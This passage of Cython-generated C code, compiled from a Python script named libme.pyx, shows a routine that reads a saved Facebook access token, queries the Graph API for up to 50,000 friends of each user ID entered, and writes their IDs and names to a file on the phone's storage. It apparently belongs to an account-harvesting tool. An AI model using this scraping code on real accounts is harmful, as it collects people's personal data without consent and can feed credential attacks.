 * 			exit("  [!] Token invalid")
 * 		try:
 */
    __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_7) {
      __Pyx_AddTraceback("libme.James.__masal__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 410, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_5);

      /* "libme.pyx":411
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")             # <<<<<<<<<<<<<<
 * 		try:
 * 			__total = int(input("\n  [!] How Much Link You Want Dump : "))
 */
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__34, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 411, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":408
 * 			self.__menn__()
 * 	def __masal__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":412
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [!] How Much Link You Want Dump : "))
 * 		except:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_2, &__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_1);
    /*try:*/ {

      /* "libme.pyx":413
 * 			exit("  [!] Token invalid")
 * 		try:
 * 			__total = int(input("\n  [!] How Much Link You Want Dump : "))             # <<<<<<<<<<<<<<
 * 		except:
 * 			__total = 1
 */
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__35, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 413, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyNumber_Int(__pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 413, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v___total = __pyx_t_6;
      __pyx_t_6 = 0;

      /* "libme.pyx":412
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [!] How Much Link You Want Dump : "))
 * 		except:
 */
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    goto __pyx_L16_try_end;
    __pyx_L11_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "libme.pyx":414
 * 		try:
 * 			__total = int(input("\n  [!] How Much Link You Want Dump : "))
 * 		except:             # <<<<<<<<<<<<<<
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/1000.txt")
 */
    /*except:*/ {
      __Pyx_AddTraceback("libme.James.__masal__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_5, &__pyx_t_4) < 0) __PYX_ERR(0, 414, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_4);

      /* "libme.pyx":415
 * 			__total = int(input("\n  [!] How Much Link You Want Dump : "))
 * 		except:
 * 			__total = 1             # <<<<<<<<<<<<<<
 * 		os.system("rm -rf /sdcard/1000.txt")
 * 		__file = ("/sdcard/1000.txt")
 */
      __Pyx_INCREF(__pyx_int_1);
      __Pyx_XDECREF_SET(__pyx_v___total, __pyx_int_1);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L12_exception_handled;
    }
    __pyx_L13_except_error:;

    /* "libme.pyx":412
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [!] How Much Link You Want Dump : "))
 * 		except:
 */
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
    goto __pyx_L1_error;
    __pyx_L12_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
    __pyx_L16_try_end:;
  }

  /* "libme.pyx":416
 * 		except:
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/1000.txt")             # <<<<<<<<<<<<<<
 * 		__file = ("/sdcard/1000.txt")
 * 		for zx in range(__total):
 */
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 416, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_system); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 416, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_kp_s_rm_rf_sdcard_1000_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s_rm_rf_sdcard_1000_txt);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 416, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  /* "libme.pyx":417
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/1000.txt")
 * 		__file = ("/sdcard/1000.txt")             # <<<<<<<<<<<<<<
 * 		for zx in range(__total):
 * 			zx += 1
 */
  __Pyx_INCREF(__pyx_kp_s_sdcard_1000_txt);
  __pyx_v___file = __pyx_kp_s_sdcard_1000_txt;

  /* "libme.pyx":418
 * 		os.system("rm -rf /sdcard/1000.txt")
 * 		__file = ("/sdcard/1000.txt")
 * 		for zx in range(__total):             # <<<<<<<<<<<<<<
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 */
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v___total); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 418, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
    __pyx_t_6 = __pyx_t_4; __Pyx_INCREF(__pyx_t_6); __pyx_t_9 = 0;
    __pyx_t_10 = NULL;
  } else {
    __pyx_t_9 = -1; __pyx_t_6 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 418, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_10 = Py_TYPE(__pyx_t_6)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 418, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  for (;;) {
    if (likely(!__pyx_t_10)) {
      if (likely(PyList_CheckExact(__pyx_t_6))) {
        if (__pyx_t_9 >= PyList_GET_SIZE(__pyx_t_6)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyList_GET_ITEM(__pyx_t_6, __pyx_t_9); __Pyx_INCREF(__pyx_t_4); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 418, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_6, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 418, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      } else {
        if (__pyx_t_9 >= PyTuple_GET_SIZE(__pyx_t_6)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_6, __pyx_t_9); __Pyx_INCREF(__pyx_t_4); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 418, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_6, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 418, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      }
    } else {
      __pyx_t_4 = __pyx_t_10(__pyx_t_6);
      if (unlikely(!__pyx_t_4)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 418, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_4);
    }
    __Pyx_XDECREF_SET(__pyx_v_zx, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":419
 * 		__file = ("/sdcard/1000.txt")
 * 		for zx in range(__total):
 * 			zx += 1             # <<<<<<<<<<<<<<
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:
 */
    __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_v_zx, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 419, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF_SET(__pyx_v_zx, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":420
 * 		for zx in range(__total):
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")             # <<<<<<<<<<<<<<
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 */
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__36, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 420, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_XDECREF_SET(__pyx_v___ids, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":421
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_1);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_3);
      /*try:*/ {

        /* "libme.pyx":422
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))             # <<<<<<<<<<<<<<
 * 				ex=json.loads(rex.text)
 * 				file = open(__file , 'a')
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_requests); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 422, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 422, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (unlikely(!__pyx_v_token)) { __Pyx_RaiseUnboundLocalError("token"); __PYX_ERR(0, 422, __pyx_L21_error) }
        __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 422, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_INCREF(__pyx_v___ids);
        __Pyx_GIVEREF(__pyx_v___ids);
        PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_v___ids);
        __Pyx_INCREF(__pyx_v_token);
        __Pyx_GIVEREF(__pyx_v_token);
        PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_v_token);
        __pyx_t_11 = __Pyx_PyString_Format(__pyx_kp_s_https_graph_facebook_com_s_field, __pyx_t_5); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 422, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_8, function);
          }
        }
        __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_5, __pyx_t_11) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_11);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 422, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF_SET(__pyx_v_rex, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":423
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)             # <<<<<<<<<<<<<<
 * 				file = open(__file , 'a')
 * 				id = []
 */
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_json); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 423, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_loads); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 423, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_rex, __pyx_n_s_text); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 423, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
          }
        }
        __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_5, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_8);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 423, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF_SET(__pyx_v_ex, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":424
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 * 				file = open(__file , 'a')             # <<<<<<<<<<<<<<
 * 				id = []
 * 				for a in ex['friends']['data']:
 */
        __pyx_t_4 = PyTuple_New(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 424, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_INCREF(__pyx_v___file);
        __Pyx_GIVEREF(__pyx_v___file);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v___file);
        __Pyx_INCREF(__pyx_n_s_a);
        __Pyx_GIVEREF(__pyx_n_s_a);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_n_s_a);
        __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_4, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 424, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_file, __pyx_t_11);
        __pyx_t_11 = 0;

        /* "libme.pyx":425
 * 				ex=json.loads(rex.text)
 * 				file = open(__file , 'a')
 * 				id = []             # <<<<<<<<<<<<<<
 * 				for a in ex['friends']['data']:
 * 					if a['id'][:6] in ['10000','100000','1000000','156']:
 */
        __pyx_t_11 = PyList_New(0); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 425, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_XDECREF_SET(__pyx_v_id, ((PyObject*)__pyx_t_11));
        __pyx_t_11 = 0;

        /* "libme.pyx":426
 * 				file = open(__file , 'a')
 * 				id = []
 * 				for a in ex['friends']['data']:             # <<<<<<<<<<<<<<
 * 					if a['id'][:6] in ['10000','100000','1000000','156']:
 * 						id.append(a['id']+"|"+a['name'])
 */
        __pyx_t_11 = __Pyx_PyObject_Dict_GetItem(__pyx_v_ex, __pyx_n_s_friends); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 426, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_11, __pyx_n_s_data); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 426, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
          __pyx_t_11 = __pyx_t_4; __Pyx_INCREF(__pyx_t_11); __pyx_t_12 = 0;
          __pyx_t_13 = NULL;
        } else {
          __pyx_t_12 = -1; __pyx_t_11 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 426, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_13 = Py_TYPE(__pyx_t_11)->tp_iternext; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 426, __pyx_L21_error)
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        for (;;) {
          if (likely(!__pyx_t_13)) {
            if (likely(PyList_CheckExact(__pyx_t_11))) {
              if (__pyx_t_12 >= PyList_GET_SIZE(__pyx_t_11)) break;
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_4 = PyList_GET_ITEM(__pyx_t_11, __pyx_t_12); __Pyx_INCREF(__pyx_t_4); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 426, __pyx_L21_error)
              #else
              __pyx_t_4 = PySequence_ITEM(__pyx_t_11, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 426, __pyx_L21_error)
              __Pyx_GOTREF(__pyx_t_4);
              #endif
            } else {
              if (__pyx_t_12 >= PyTuple_GET_SIZE(__pyx_t_11)) break;
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_11, __pyx_t_12); __Pyx_INCREF(__pyx_t_4); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 426, __pyx_L21_error)
              #else
              __pyx_t_4 = PySequence_ITEM(__pyx_t_11, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 426, __pyx_L21_error)
              __Pyx_GOTREF(__pyx_t_4);
              #endif
            }
          } else {
            __pyx_t_4 = __pyx_t_13(__pyx_t_11);
            if (unlikely(!__pyx_t_4)) {
              PyObject* exc_type = PyErr_Occurred();
              if (exc_type) {
                if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                else __PYX_ERR(0, 426, __pyx_L21_error)
              }
              break;
            }
            __Pyx_GOTREF(__pyx_t_4);
          }
          __Pyx_XDECREF_SET(__pyx_v_a, __pyx_t_4);
          __pyx_t_4 = 0;

          /* "libme.pyx":427
 * 				id = []
 * 				for a in ex['friends']['data']:
 * 					if a['id'][:6] in ['10000','100000','1000000','156']:             # <<<<<<<<<<<<<<
 * 						id.append(a['id']+"|"+a['name'])
 * 						file.write(a['id']+"|"+a['name']+'\n')
 */
          __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 427, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_8 = __Pyx_PyObject_GetSlice(__pyx_t_4, 0, 6, NULL, NULL, &__pyx_slice__37, 0, 1, 1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 427, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_10000, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 427, __pyx_L21_error)
          if (!__pyx_t_15) {
          } else {
            __pyx_t_14 = __pyx_t_15;
            goto __pyx_L32_bool_binop_done;
          }
          __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_100000, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 427, __pyx_L21_error)
          if (!__pyx_t_15) {
          } else {
            __pyx_t_14 = __pyx_t_15;
            goto __pyx_L32_bool_binop_done;
          }
          __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_1000000, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 427, __pyx_L21_error)
          if (!__pyx_t_15) {
          } else {
            __pyx_t_14 = __pyx_t_15;
            goto __pyx_L32_bool_binop_done;
          }
          __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_156, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 427, __pyx_L21_error)
          __pyx_t_14 = __pyx_t_15;
          __pyx_L32_bool_binop_done:;
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_15 = (__pyx_t_14 != 0);
          if (__pyx_t_15) {

            /* "libme.pyx":428
 * 				for a in ex['friends']['data']:
 * 					if a['id'][:6] in ['10000','100000','1000000','156']:
 * 						id.append(a['id']+"|"+a['name'])             # <<<<<<<<<<<<<<
 * 						file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):
 */
            __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_id); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 428, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_4 = PyNumber_Add(__pyx_t_8, __pyx_kp_s__38); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 428, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_name); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 428, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_t_8); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 428, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_id, __pyx_t_5); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 428, __pyx_L21_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":429
 * 					if a['id'][:6] in ['10000','100000','1000000','156']:
 * 						id.append(a['id']+"|"+a['name'])
 * 						file.write(a['id']+"|"+a['name']+'\n')             # <<<<<<<<<<<<<<
 * 			except(KeyError , IOError):
 * 				exit("  [] Warning! Check link")
 */
            __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_file, __pyx_n_s_write); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 429, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 429, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_17 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__38); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 429, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_17);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_name); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 429, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_18 = PyNumber_Add(__pyx_t_17, __pyx_t_4); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 429, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = PyNumber_Add(__pyx_t_18, __pyx_kp_s__39); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 429, __pyx_L21_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            __pyx_t_18 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
              __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_8);
              if (likely(__pyx_t_18)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                __Pyx_INCREF(__pyx_t_18);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_8, function);
